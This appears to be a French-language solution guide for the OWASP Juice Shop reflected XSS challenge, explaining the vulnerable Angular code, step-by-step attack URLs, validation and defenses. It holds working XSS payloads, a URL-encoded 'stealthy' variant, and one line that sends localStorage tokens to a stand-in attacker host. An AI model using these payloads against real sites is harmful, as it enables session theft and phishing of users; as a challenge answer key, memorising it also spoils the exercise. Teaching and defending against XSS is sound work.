# Solution canonique - reflectedXssChallenge : Reflected XSS

## Contexte

Apres un achat, Juice Shop propose de suivre la commande via une page
Track Order dont l'URL est `/#/track-result?id=<orderId>`. Le composant
Angular cible lit le parametre `id` de la query string et l'insere dans
le DOM via `bypassSecurityTrustHtml`. Comme dans le DOM XSS, l'echappement
HTML est explicitement bypassed.

La difference fondamentale avec le DOM XSS : le payload arrive via un
parametre d'URL, ce qui le rend partageable. Un attaquant peut envoyer
le lien malveillant a une victime par email ou messagerie, et la victime
qui clique declenche l'attaque dans son navigateur, dans le contexte de
sa session Juice Shop authentifiee.

## Vulnerabilite exploitee

Reflected Cross-Site Scripting. OWASP Top 10 2021 : A03:2021 Injection.
CWE-79 Improper Neutralization of Input During Web Page Generation.

Le composant Angular cible est `track-result.component.ts` :

```typescript
this.orderId = this.route.snapshot.queryParams.id
// ...
this.results.orderNo = this.sanitizer.bypassSecurityTrustHtml(
  `<code>${results.data[0].orderId}</code>`
)
```

Le parametre id est lu et insere dans une template string puis dans le
DOM via bypassSecurityTrustHtml.

## Etapes de resolution

1. **Etape 1 - Identifier la page vulnerable** : la page Track Order
   est accessible via /#/track-result?id=XXXX.

2. **Etape 2 - Tester un probe** : essayer
   `http://127.0.0.1:3000/#/track-result?id=<h1>test</h1>` et observer
   si "test" apparait en grand. Confirme que id est insere comme HTML.

3. **Etape 3 - Construire l'URL d'attaque** : utiliser le meme payload
   que pour DOM XSS, en parametre id :
   ```
   http://127.0.0.1:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">
   ```
   Le navigateur encode automatiquement les caracteres < > " a
   l'envoi.

4. **Etape 4 - Charger l'URL** : taper ou coller l'URL dans la barre
   d'adresse, appuyer sur Entree.

5. **Etape 5 - Observer** : une popup `xss` s'affiche. Le payload est
   passe par le parametre id, lu par Angular, et execute.

6. **Etape 6 - Validation** : Juice Shop detecte le payload dans le
   parametre id de la route /#/track-result et marque le challenge
   solved.

## Validation automatique

Le backend Juice Shop intercepte les requetes vers la page de tracking
et examine le parametre id. Si une regex match le payload XSS attendu,
`reflectedXssChallenge` est marque solved.

## Concept enseigne

Reflected XSS = XSS via URL partageable. C'est ce qui rend cette
vulnerabilite particulierement dangereuse : elle peut etre weaponisee
pour des attaques ciblees (spear phishing). Une URL legitime
(juice-sh.op) avec un payload encode peut paraitre inoffensive a une
victime non technique.

Concept secondaire : la chaine d'attribution. Une URL Reflected XSS
declenche l'attaque dans le contexte de la victime (ses cookies, son
JWT, sa session). Toutes les actions effectuees par le payload sont
imputables a la victime cote serveur.

## Prevention

Identique au DOM XSS, plus :

1. **Validation des parametres d'URL** : les parametres `id` doivent
   etre numeriques (UUID ou int). Une validation server-side via
   Joi/Yup/Zod refuse tout parametre qui ne correspond pas au schema.
   Cela bloque l'attaque AVANT le rendu.

2. **CSP avec nonce ou hash** : un script tag injecte ne peut pas
   s'executer sans le nonce du request courant. Bloque les payloads
   `<script>`. Mais attention : les iframes javascript: ne sont pas
   bloquees par CSP script-src ; il faut `frame-src 'self'` aussi.

3. **HTTPOnly + SameSite cookies** : meme si le payload XSS s'execute,
   il ne peut pas exfiltrer le cookie de session via JavaScript. Le
   token JWT en localStorage reste vulnerable.

4. **Subresource Integrity (SRI)** : pour les scripts externes, utiliser
   l'attribut integrity. Empeche un script externe modifie de
   s'executer.

## Variantes pour etudiants avances

- Crafter une URL malveillante "stealthe" (URL-encode total, paraitre
  inoffensive) :
  `http://127.0.0.1:3000/#/track-result?id=%3Ciframe+src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E`
- Tester si le payload survit a un partage par un raccourcisseur d'URL.
- Construire un payload qui exfiltre le contenu du localStorage vers
  un serveur attaquant (educatif uniquement, jamais en environnement
  reel sans autorisation) :
  `<iframe src="javascript:fetch('//attacker.tld/?'+localStorage.token)">`
- Discussion : pourquoi de nombreuses applications laissent-elles
  passer ce type de vulnerabilite ? (souvent : le frontend est traite
  comme une "vue" inoffensive, alors que c'est en fait une zone
  d'execution de code dans le contexte de la victime).
